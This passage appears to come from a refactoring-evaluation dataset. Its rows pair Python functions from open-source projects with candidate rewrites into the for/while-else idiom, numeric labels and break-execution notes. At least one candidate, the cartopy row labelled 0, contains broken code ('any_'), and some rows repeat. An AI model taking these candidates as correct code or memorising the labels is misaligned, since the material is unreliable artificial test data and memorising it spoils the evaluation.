                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
BERT-Classification-Tutorial,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/BERT-Classification-Tutorial/tokenization.py,https://github.com/Socialbird-AILab/BERT-Classification-Tutorial/tree/master//tokenization.py,WordpieceTokenizer,tokenize$201,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer.

        Returns:
          A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
uiautomator2,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/uiautomator2/uiautomator2/watcher.py,https://github.com/openatx/uiautomator2/tree/master/uiautomator2/watcher.py,WatchContext,_run$91,"def _run(self) -> bool:
        logger.debug(""watch check"")
        source = self._d.dump_hierarchy()
        for xpaths, func in self._callbacks.items():
            ok = True
            last_match = None
            for xpath in xpaths:
                sel = self._d.xpath(xpath, source=source)
                if not sel.exists:
                    ok = False
                    break
                last_match = sel.get_last_match()
                logger.debug(""match: %s"", xpath)
            if ok:
                # 全部匹配
                logger.debug(""watchContext xpath matched: %s"", xpaths)
                self._run_callback(func, last_match)
                return True
        return False","for xpath in xpaths:
    sel = self._d.xpath(xpath, source=source)
    if not sel.exists:
        ok = False
        break
    last_match = sel.get_last_match()
    logger.debug('match: %s', xpath)
if ok:
    logger.debug('watchContext xpath matched: %s', xpaths)
    self._run_callback(func, last_match)
    return True","for xpath in xpaths:
    sel = self._d.xpath(xpath, source=source)
    if not sel.exists:
        break
    last_match = sel.get_last_match()
    logger.debug('match: %s', xpath)
else:
    logger.debug('watchContext xpath matched: %s', xpaths)
    self._run_callback(func, last_match)
    return True","for xpath in xpaths:
    sel = self._d.xpath(xpath, source=source)
    if not sel.exists:
        break
    last_match = sel.get_last_match()
    logger.debug('match: %s', xpath)
else:
    logger.debug('watchContext xpath matched: %s', xpaths)
    self._run_callback(func, last_match)
    return True",1,"for xpath in xpaths:
    sel = self._d.xpath(xpath, source=source)
    if not sel.exists:
        ok = False
        break
    last_match = sel.get_last_match()
    logger.debug('match: %s', xpath)
if ok:
    logger.debug('watchContext xpath matched: %s', xpaths)
    self._run_callback(func, last_match)
    return True","break statement is executed:None
break statement is not executed:zejun1"
DDParser,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/DDParser/tools/representation/demo/ERNIE/tokenization.py,https://github.com/baidu/DDParser/tree/master/tools/representation/demo/ERNIE/tokenization.py,WordpieceTokenizer,tokenize$279,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
            input = ""unaffable""
            output = [""un"", ""##aff"", ""##able""]

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through `BasicTokenizer.

        Returns:
            A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
DDParser,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/DDParser/tools/representation/demo/ERNIE/tokenization.py,https://github.com/baidu/DDParser/tree/master/tools/representation/demo/ERNIE/tokenization.py,WordpieceTokenizer,tokenize$279,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
            input = ""unaffable""
            output = [""un"", ""##aff"", ""##able""]

        Args:
            text: A single token or whitespace separated tokens. This should have
                already been passed through `BasicTokenizer.

        Returns:
            A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
brownie,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/brownie/brownie/network/rpc/hardhat.py,https://github.com/eth-brownie/brownie/tree/master/brownie/network/rpc/hardhat.py,,launch$40,"def launch(cmd: str, **kwargs: Dict) -> None:
    """"""Launches the RPC client.

    Args:
        cmd: command string to execute as subprocess""""""
    if sys.platform == ""win32"" and not cmd.split("" "")[0].endswith("".cmd""):
        if "" "" in cmd:
            cmd = cmd.replace("" "", "".cmd "", 1)
        else:
            cmd += "".cmd""
    cmd_list = cmd.split("" "")
    for key, value in [(k, v) for k, v in kwargs.items() if v and k not in IGNORED_SETTINGS]:
        try:
            cmd_list.extend([CLI_FLAGS[key], str(value)])
        except KeyError:
            warnings.warn(
                f""Ignoring invalid commandline setting for hardhat: ""
                f'""{key}"" with value ""{value}"".',
                InvalidArgumentWarning,
            )
    print(f""\nLaunching '{' '.join(cmd_list)}'..."")
    out = DEVNULL if sys.platform == ""win32"" else PIPE

    # check parent folders for existence of a hardhat config, so this folder is
    # considered a hardhat project. if none is found, create one.
    config_exists = False
    for path in Path(""hardhat.config.js"").absolute().parents:
        if path.joinpath(""hardhat.config.js"").exists():
            config_exists = True
            break
    if not config_exists:
        with Path(""hardhat.config.js"").open(""w"") as fp:
            fp.write(HARDHAT_CONFIG)

    return psutil.Popen(cmd_list, stdin=DEVNULL, stdout=out, stderr=out)","for path in Path('hardhat.config.js').absolute().parents:
    if path.joinpath('hardhat.config.js').exists():
        config_exists = True
        break
if not config_exists:
    with Path('hardhat.config.js').open('w') as fp:
        fp.write(HARDHAT_CONFIG)","for path in Path('hardhat.config.js').absolute().parents:
    if path.joinpath('hardhat.config.js').exists():
        break
else:
    with Path('hardhat.config.js').open('w') as fp:
        fp.write(HARDHAT_CONFIG)","for path in Path('hardhat.config.js').absolute().parents:
    if path.joinpath('hardhat.config.js').exists():
        break
else:
    with Path('hardhat.config.js').open('w') as fp:
        fp.write(HARDHAT_CONFIG)",1,"for path in Path('hardhat.config.js').absolute().parents:
    if path.joinpath('hardhat.config.js').exists():
        config_exists = True
        break
if not config_exists:
    with Path('hardhat.config.js').open('w') as fp:
        fp.write(HARDHAT_CONFIG)","break statement is executed:None
break statement is not executed:zejun1"
VRM_Addon_for_Blender,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/VRM_Addon_for_Blender/io_scene_vrm/exporter/glb_obj.py,https://github.com/saturday06/VRM_Addon_for_Blender/tree/master/io_scene_vrm/exporter/glb_obj.py,GlbObj,add_gltf2_io_texture$976,"def add_gltf2_io_texture(
            gltf2_io_texture_info: Any,
        ) -> Dict[str, Union[int, float]]:
            image = gltf2_io_texture_info.index.source
            found = False
            for (name, data, index) in gltf2_io_texture_images:
                if name != image.name or data != image.buffer_view.data:
                    continue
                image_index = index
                image_name = {value: key for key, value in image_id_dic.items()}[
                    image_index
                ]
                found = True
                break
            if not found:
                image_index = self.glb_bin_collector.get_new_image_id()
                gltf2_io_texture_images.append(
                    (image.name, image.buffer_view.data, image_index)
                )
                image_base_name = re.sub(
                    r""^BlenderVrmAddonImport[0-9]+Image[0-9]+_"", """", image.name
                )
                for count in range(100000):
                    image_name = image_base_name
                    if count:
                        image_name += ""."" + str(count)
                    if image_name not in image_id_dic:
                        break
                image_id_dic[image_name] = image_index
                ImageBin(
                    image.buffer_view.data,
                    image_name,
                    image.mime_type,
                    self.glb_bin_collector,
                )

            sampler = gltf2_io_texture_info.index.sampler
            if sampler is None:
                sampler_dic_key = (
                    GlConstants.REPEAT,
                    GlConstants.REPEAT,
                    GlConstants.LINEAR,
                    GlConstants.LINEAR,
                )
            else:
                sampler_dic_key = (
                    sampler.wrap_s or GlConstants.REPEAT,
                    sampler.wrap_t or GlConstants.REPEAT,
                    sampler.mag_filter or GlConstants.LINEAR,
                    sampler.min_filter or GlConstants.LINEAR,
                )

                # VRoid Hub may not support a mipmap
                if sampler_dic_key[3] in [
                    GlConstants.NEAREST_MIPMAP_LINEAR,
                    GlConstants.NEAREST_MIPMAP_NEAREST,
                ]:
                    sampler_dic_key = sampler_dic_key[0:3] + (GlConstants.NEAREST,)
                elif sampler_dic_key[3] in [
                    GlConstants.LINEAR_MIPMAP_NEAREST,
                    GlConstants.LINEAR_MIPMAP_LINEAR,
                ]:
                    sampler_dic_key = sampler_dic_key[0:3] + (GlConstants.LINEAR,)

            if sampler_dic_key not in sampler_dic.keys():
                sampler_dic.update({sampler_dic_key: len(sampler_dic)})
            if (image_index, sampler_dic[sampler_dic_key]) not in texture_dic.keys():
                texture_dic.update(
                    {(image_index, sampler_dic[sampler_dic_key]): len(texture_dic)}
                )
            texture_info: Dict[str, Union[int, float]] = {
                ""index"": texture_dic[(image_index, sampler_dic[sampler_dic_key])],
                ""texCoord"": 0,  # TODO
            }
            if hasattr(gltf2_io_texture_info, ""scale"") and isinstance(
                gltf2_io_texture_info.scale, (int, float)
            ):
                texture_info[""scale""] = gltf2_io_texture_info.scale
            if hasattr(gltf2_io_texture_info, ""strength"") and isinstance(
                gltf2_io_texture_info.strength, (int, float)
            ):
                texture_info[""strength""] = gltf2_io_texture_info.strength
            return texture_info","for (name, data, index) in gltf2_io_texture_images:
    if name != image.name or data != image.buffer_view.data:
        continue
    image_index = index
    image_name = {value: key for (key, value) in image_id_dic.items()}[image_index]
    found = True
    break
if not found:
    image_index = self.glb_bin_collector.get_new_image_id()
    gltf2_io_texture_images.append((image.name, image.buffer_view.data, image_index))
    image_base_name = re.sub('^BlenderVrmAddonImport[0-9]+Image[0-9]+_', '', image.name)
    for count in range(100000):
        image_name = image_base_name
        if count:
            image_name += '.' + str(count)
        if image_name not in image_id_dic:
            break
    image_id_dic[image_name] = image_index
    ImageBin(image.buffer_view.data, image_name, image.mime_type, self.glb_bin_collector)","for (name, data, index) in gltf2_io_texture_images:
    if name != image.name or data != image.buffer_view.data:
        continue
    image_index = index
    image_name = {value: key for (key, value) in image_id_dic.items()}[image_index]
    break
else:
    image_index = self.glb_bin_collector.get_new_image_id()
    gltf2_io_texture_images.append((image.name, image.buffer_view.data, image_index))
    image_base_name = re.sub('^BlenderVrmAddonImport[0-9]+Image[0-9]+_', '', image.name)
    for count in range(100000):
        image_name = image_base_name
        if count:
            image_name += '.' + str(count)
        if image_name not in image_id_dic:
            break
    image_id_dic[image_name] = image_index
    ImageBin(image.buffer_view.data, image_name, image.mime_type, self.glb_bin_collector)","for (name, data, index) in gltf2_io_texture_images:
    if name != image.name or data != image.buffer_view.data:
        continue
    image_index = index
    image_name = {value: key for (key, value) in image_id_dic.items()}[image_index]
    break
else:
    image_index = self.glb_bin_collector.get_new_image_id()
    gltf2_io_texture_images.append((image.name, image.buffer_view.data, image_index))
    image_base_name = re.sub('^BlenderVrmAddonImport[0-9]+Image[0-9]+_', '', image.name)
    for count in range(100000):
        image_name = image_base_name
        if count:
            image_name += '.' + str(count)
        if image_name not in image_id_dic:
            break
    image_id_dic[image_name] = image_index
    ImageBin(image.buffer_view.data, image_name, image.mime_type, self.glb_bin_collector)",1,"for (name, data, index) in gltf2_io_texture_images:
    if name != image.name or data != image.buffer_view.data:
        continue
    image_index = index
    image_name = {value: key for (key, value) in image_id_dic.items()}[image_index]
    found = True
    break
if not found:
    image_index = self.glb_bin_collector.get_new_image_id()
    gltf2_io_texture_images.append((image.name, image.buffer_view.data, image_index))
    image_base_name = re.sub('^BlenderVrmAddonImport[0-9]+Image[0-9]+_', '', image.name)
    for count in range(100000):
        image_name = image_base_name
        if count:
            image_name += '.' + str(count)
        if image_name not in image_id_dic:
            break
    image_id_dic[image_name] = image_index
    ImageBin(image.buffer_view.data, image_name, image.mime_type, self.glb_bin_collector)","break statement is executed:None
break statement is not executed:zejun1"
cartopy,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/cartopy/lib/cartopy/crs.py,https://github.com/SciTools/cartopy/tree/master/lib/cartopy/crs.py,Projection,_project_linear_ring$813,"def _project_linear_ring(self, linear_ring, src_crs):
        """"""
        Project the given LinearRing from the src_crs into this CRS and
        returns a list of LinearRings and a single MultiLineString.

        """"""
        debug = False
        # 1) Resolve the initial lines into projected segments
        # 1abc
        # def23ghi
        # jkl41
        multi_line_string = cartopy.trace.project_linear(linear_ring,
                                                         src_crs, self)

        # Threshold for whether a point is close enough to be the same
        # point as another.
        threshold = max(np.abs(self.x_limits + self.y_limits)) * 1e-5

        # 2) Simplify the segments where appropriate.
        if len(multi_line_string.geoms) > 1:
            # Stitch together segments which are close to continuous.
            # This is important when:
            # 1) The first source point projects into the map and the
            # ring has been cut by the boundary.
            # Continuing the example from above this gives:
            #   def23ghi
            #   jkl41abc
            # 2) The cut ends of segments are too close to reliably
            # place into an order along the boundary.

            line_strings = list(multi_line_string.geoms)
            any_modified = False
            i = 0
            if debug:
                first_coord = np.array([ls.coords[0] for ls in line_strings])
                last_coord = np.array([ls.coords[-1] for ls in line_strings])
                print('Distance matrix:')
                np.set_printoptions(precision=2)
                x = first_coord[:, np.newaxis, :]
                y = last_coord[np.newaxis, :, :]
                print(np.abs(x - y).max(axis=-1))

            while i < len(line_strings):
                modified = False
                j = 0
                while j < len(line_strings):
                    if i != j and np.allclose(line_strings[i].coords[0],
                                              line_strings[j].coords[-1],
                                              atol=threshold):
                        if debug:
                            print(f'Joining together {i} and {j}.')
                        last_coords = list(line_strings[j].coords)
                        first_coords = list(line_strings[i].coords)[1:]
                        combo = sgeom.LineString(last_coords + first_coords)
                        if j < i:
                            i, j = j, i
                        del line_strings[j], line_strings[i]
                        line_strings.append(combo)
                        modified = True
                        any_modified = True
                        break
                    else:
                        j += 1
                if not modified:
                    i += 1
            if any_modified:
                multi_line_string = sgeom.MultiLineString(line_strings)

        # 3) Check for rings that have been created by the projection stage.
        rings = []
        line_strings = []
        for line in multi_line_string.geoms:
            if len(line.coords) > 3 and np.allclose(line.coords[0],
                                                    line.coords[-1],
                                                    atol=threshold):
                result_geometry = sgeom.LinearRing(line.coords[:-1])
                rings.append(result_geometry)
            else:
                line_strings.append(line)
        # If we found any rings, then we should re-create the multi-line str.
        if rings:
            multi_line_string = sgeom.MultiLineString(line_strings)

        return rings, multi_line_string","while j < len(line_strings):
    if i != j and np.allclose(line_strings[i].coords[0], line_strings[j].coords[-1], atol=threshold):
        if debug:
            print(f'Joining together {i} and {j}.')
        last_coords = list(line_strings[j].coords)
        first_coords = list(line_strings[i].coords)[1:]
        combo = sgeom.LineString(last_coords + first_coords)
        if j < i:
            (i, j) = (j, i)
        del line_strings[j], line_strings[i]
        line_strings.append(combo)
        modified = True
        any_modified = True
        break
    else:
        j += 1
if not modified:
    i += 1","while j < len(line_strings):
    if i != j and np.allclose(line_strings[i].coords[0], line_strings[j].coords[-1], atol=threshold):
        if debug:
            print(f'Joining together {i} and {j}.')
        last_coords = list(line_strings[j].coords)
        first_coords = list(line_strings[i].coords)[1:]
        combo = sgeom.LineString(last_coords + first_coords)
        if j < i:
            (i, j) = (j, i)
        del line_strings[j], line_strings[i]
        line_strings.append(combo)
        any_
        break
    else:
        j += 1
else:
    i += 1","while j < len(line_strings):
    if i != j and np.allclose(line_strings[i].coords[0], line_strings[j].coords[-1], atol=threshold):
        if debug:
            print(f'Joining together {i} and {j}.')
        last_coords = list(line_strings[j].coords)
        first_coords = list(line_strings[i].coords)[1:]
        combo = sgeom.LineString(last_coords + first_coords)
        if j < i:
            (i, j) = (j, i)
        del line_strings[j], line_strings[i]
        line_strings.append(combo)
        any_modified = True
        break
    else:
        j += 1
else:
    i += 1",0,"while j < len(line_strings):
    if i != j and np.allclose(line_strings[i].coords[0], line_strings[j].coords[-1], atol=threshold):
        if debug:
            print(f'Joining together {i} and {j}.')
        last_coords = list(line_strings[j].coords)
        first_coords = list(line_strings[i].coords)[1:]
        combo = sgeom.LineString(last_coords + first_coords)
        if j < i:
            (i, j) = (j, i)
        del line_strings[j], line_strings[i]
        line_strings.append(combo)
        modified = True
        any_modified = True
        break
    else:
        j += 1
if not modified:
    i += 1","break statement is executed:None
break statement is not executed:zejun1"
tvm,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tvm/python/tvm/relay/frontend/tensorflow_ops.py,https://github.com/apache/tvm/tree/master/python/tvm/relay/frontend/tensorflow_ops.py,,_impl$2036,"def _impl(inputs, attr, params, mod):
        is_symbolic_shape = False
        input_shape = _infer_shape(inputs[0], mod)
        for axis in input_shape:
            if not isinstance(axis, (int, tvm.tir.IntImm)):
                is_symbolic_shape = True
                break

        if is_symbolic_shape:
            ret = _op.shape_of(inputs[0], dtype=attr[""out_type""].name)
        else:
            ret = np.array(input_shape, dtype=attr[""out_type""].name)
        return ret","for axis in input_shape:
    if not isinstance(axis, (int, tvm.tir.IntImm)):
        is_symbolic_shape = True
        break
if is_symbolic_shape:
    ret = _op.shape_of(inputs[0], dtype=attr['out_type'].name)
else:
    ret = np.array(input_shape, dtype=attr['out_type'].name)","for axis in input_shape:
    if not isinstance(axis, (int, tvm.tir.IntImm)):
        ret = _op.shape_of(inputs[0], dtype=attr['out_type'].name)
        break
else:
    ret = np.array(input_shape, dtype=attr['out_type'].name)","for axis in input_shape:
    if not isinstance(axis, (int, tvm.tir.IntImm)):
        ret = _op.shape_of(inputs[0], dtype=attr['out_type'].name)
        break
else:
    ret = np.array(input_shape, dtype=attr['out_type'].name)",1,"for axis in input_shape:
    if not isinstance(axis, (int, tvm.tir.IntImm)):
        is_symbolic_shape = True
        break
if is_symbolic_shape:
    ret = _op.shape_of(inputs[0], dtype=attr['out_type'].name)
else:
    ret = np.array(input_shape, dtype=attr['out_type'].name)","break statement is executed:zejun1
break statement is not executed:None"
mara-pipelines,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mara-pipelines/mara_pipelines/execution.py,https://github.com/mara/mara-pipelines/tree/master/mara_pipelines/execution.py,,run$66,"def run():

        statistics_process: multiprocessing.Process = None

        try:
            # capture output of print statements and other unplanned output
            logger.redirect_output(event_queue, pipeline.path())

            # all nodes that have not run yet, ordered by priority
            node_queue: [pipelines.Node] = []

            # data needed for computing cost
            node_durations_and_run_times = node_cost.node_durations_and_run_times(pipeline) if use_historical_node_cost else {}

            # Putting nodes into the node queue
            def queue(nodes: [pipelines.Node]):
                for node in nodes:
                    node_cost.compute_cost(node, node_durations_and_run_times)
                    node_queue.append(node)
                node_queue.sort(key=lambda node: node.cost, reverse=True)

            if nodes:  # only run a set of child nodes
                def with_all_upstreams(nodes: {pipelines.Node}):
                    """"""recursively find all upstreams of a list of nodes""""""
                    return functools.reduce(set.union, [with_all_upstreams(node.upstreams) for node in nodes], nodes)

                # when requested, include all upstreams of nodes, otherwise just use provided nodes
                nodes_to_run = with_all_upstreams(set(nodes)) if with_upstreams else set(nodes)

                # remove everything from pipeline that should not be run
                # (that's makes updating dependencies between nodes easier)
                for node in set(pipeline.nodes.values()) - nodes_to_run:
                    pipeline.remove(node)

                # queue remaining nodes
                queue(list((pipeline.nodes).values()))

            else:
                # remove dependencies to siblings
                pipeline.upstreams = set()
                pipeline.downstreams = set()
                # queue whole pipeline
                queue([pipeline])

            # book keeping
            run_start_time = datetime.datetime.now(tz.utc)
            # all nodes that already ran or that won't be run anymore
            processed_nodes: {pipelines.Node} = set()
            # running pipelines with start times and number of running children
            running_pipelines: {pipelines.Pipeline: [datetime.datetime, int]} = {}
            failed_pipelines: {pipelines.Pipeline} = set()  # pipelines with failed tasks
            running_task_processes: {pipelines.Task: TaskProcess} = {}

            # make sure any running tasks are killed when this executor process is shutdown
            executor_pid = os.getpid()

            def ensure_task_processes_killed():
                # as we fork, the TaskProcess also runs this function -> ignore it there
                if os.getpid() != executor_pid: return
                try:
                    for tp in list(running_task_processes.values()):  # type: TaskProcess
                        if tp.is_alive():
                            # give it a chance to gracefully shutdown
                            tp.terminate()
                    if statistics_process:
                        statistics_process.kill()
                except BaseException as e:
                    print(f""Exception during TaskProcess cleanup: {repr(e)}"", file=sys.stderr, flush=True)
                return

            atexit.register(ensure_task_processes_killed)

            def dequeue() -> pipelines.Node:
                """"""
                Finds the next task in the queue
                - without upstreams or where all upstreams have been run already
                - where the pipeline specific maximum number of parallel tasks per pipeline is not reached
                """"""
                for node in node_queue:  # type: pipelines.Node
                    if ((not node.upstreams or len(node.upstreams & processed_nodes) == len(node.upstreams))
                        and (not isinstance(node.parent, pipelines.Pipeline)
                             or (not node.parent.max_number_of_parallel_tasks)
                             or (not node.parent in running_pipelines)
                             or (running_pipelines[node.parent][1] < node.parent.max_number_of_parallel_tasks))):
                        node_queue.remove(node)
                        processed_as_parent_failed = False
                        parent = node.parent
                        while parent:
                            # if the parent pipeline failed (and no overwrite), don't launch new nodes
                            # this needs to go down to the ultimate parent as we can have cases where we already
                            # queued a subpipeline and now the parent pipeline failed but the tasks parent pipeline
                            # (the sub pipeline) is not failed.
                            # If a task from a parent pipeline fails, even with force_run_all_children on the
                            # sub pipeline, the sub pipeline would stop. Only if the failed parent pipeline also has
                            # force_run_all_children, the task would get scheduled
                            if parent in failed_pipelines and not parent.force_run_all_children:
                                processed_nodes.add(node)
                                processed_as_parent_failed = True
                                break
                            else: parent = parent.parent
                        if not processed_as_parent_failed:
                            return node

            def track_finished_pipelines():
                """"""when all nodes of a pipeline have been processed, then emit events""""""
                for running_pipeline, (start_time, running_children) \
                    in dict(running_pipelines).items():  # type: pipelines.Pipeline
                    if len(set(running_pipeline.nodes.values()) & processed_nodes) == len(running_pipeline.nodes):
                        succeeded = running_pipeline not in failed_pipelines
                        event_queue.put(pipeline_events.Output(
                            node_path=running_pipeline.path(), format=logger.Format.ITALICS, is_error=not succeeded,
                            message=f'{""succeeded"" if succeeded else ""failed""}, {logger.format_time_difference(run_start_time, datetime.datetime.now(tz.utc))}'))
                        event_queue.put(pipeline_events.NodeFinished(
                            node_path=running_pipeline.path(), start_time=start_time,
                            end_time=datetime.datetime.now(tz.utc), is_pipeline=True, succeeded=succeeded))
                        del running_pipelines[running_pipeline]
                        processed_nodes.add(running_pipeline)

            # announce run start
            event_queue.put(pipeline_events.RunStarted(node_path=pipeline.path(),
                                                       start_time=run_start_time,
                                                       pid=os.getpid(),
                                                       interactively_started=interactively_started,
                                                       node_ids=[node.id for node in (nodes or [])],
                                                       is_root_pipeline=(pipeline.parent is None))
                            )

            # collect system stats in a separate Process
            if config.system_statistics_collection_period():
                statistics_process = multiprocessing.Process(
                    target=lambda: system_statistics.generate_system_statistics(event_queue), name='system_statistics')
                statistics_process.start()

            # run as long
            # - as task processes are still running
            # - as there is still stuff in the node queue
            while running_task_processes or node_queue:
                # don't do anything if the maximum number of parallel tasks is currently running
                if len(running_task_processes) < config.max_number_of_parallel_tasks():

                    next_node = dequeue()  # get the next runnable node from the queue

                    if next_node:
                        if isinstance(next_node, pipelines.Pipeline):
                            # connect pipeline nodes without upstreams to upstreams of pipeline
                            for upstream in next_node.upstreams:
                                for pipeline_node in next_node.nodes.values():
                                    if not pipeline_node.upstreams:
                                        next_node.add_dependency(upstream, pipeline_node)

                            # connect pipeline nodes without downstreams to downstream of pipeline
                            for downstream in next_node.downstreams:
                                for pipeline_node in next_node.nodes.values():
                                    if not pipeline_node.downstreams:
                                        next_node.add_dependency(pipeline_node, downstream)

                            # get cost information for children
                            if use_historical_node_cost:
                                node_durations_and_run_times.update(node_cost.node_durations_and_run_times(next_node))

                            # queue all child nodes
                            queue(list(next_node.nodes.values()))

                            # book keeping and event emission
                            pipeline_start_time = datetime.datetime.now(tz.utc)
                            running_pipelines[next_node] = [pipeline_start_time, 0]
                            event_queue.put(pipeline_events.NodeStarted(next_node.path(), pipeline_start_time, True))
                            event_queue.put(pipeline_events.Output(
                                node_path=next_node.path(), format=logger.Format.ITALICS,
                                message='★ ' + node_cost.format_duration(
